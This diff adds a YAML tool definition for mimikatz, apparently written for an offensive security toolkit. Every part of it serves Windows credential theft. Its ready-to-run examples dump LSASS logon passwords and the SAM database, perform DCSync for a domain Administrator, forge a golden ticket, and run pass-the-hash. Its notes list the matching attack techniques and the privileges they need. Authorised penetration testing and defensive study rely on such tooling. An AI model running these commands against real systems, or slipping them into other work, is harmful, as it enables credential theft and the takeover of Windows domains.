@@ -1,0 +1,56 @@
+name: mimikatz
+category: ad
+description: Windows credential extraction and manipulation tool.
+keywords:
+  - credentials
+  - password
+  - hash
+  - windows
+  - lsass
+  - kerberos
+  - golden ticket
+
+parameters:
+  command:
+    type: string
+    required: true
+    description: Mimikatz command to run
+
+  log:
+    type: string
+    description: Log output to file
+
+requires_root: true
+timeout: 120
+
+examples:
+  - "mimikatz 'privilege::debug' 'sekurlsa::logonpasswords' exit"
+  - "mimikatz 'privilege::debug' 'lsadump::sam' exit"
+  - "mimikatz 'privilege::debug' 'lsadump::dcsync /domain:corp.local /user:Administrator' exit"
+  - "mimikatz 'kerberos::golden /domain:corp.local /sid:S-1-5-21-... /rc4:hash /user:fakeadmin /ptt' exit"
+  - "mimikatz 'sekurlsa::pth /user:admin /domain:corp /ntlm:hash /run:cmd' exit"
+
+notes: |
+  Common modules:
+  - sekurlsa::logonpasswords
+  - sekurlsa::wdigest
+  - lsadump::sam
+  - lsadump::dcsync
+  - kerberos::list
+  - kerberos::golden
+  - kerberos::ptt
+
+  Attacks:
+  - Pass-the-Hash (sekurlsa::pth)
+  - Pass-the-Ticket (kerberos::ptt)
+  - Golden Ticket (kerberos::golden)
+  - Silver Ticket (kerberos::silver)
+  - DCSync (lsadump::dcsync)
+
+  Requirements:
+  - Admin/SYSTEM privileges
+  - Debug privileges
+
+  On Linux:
+  - Use via wine
+  - Or pypykatz for Python version
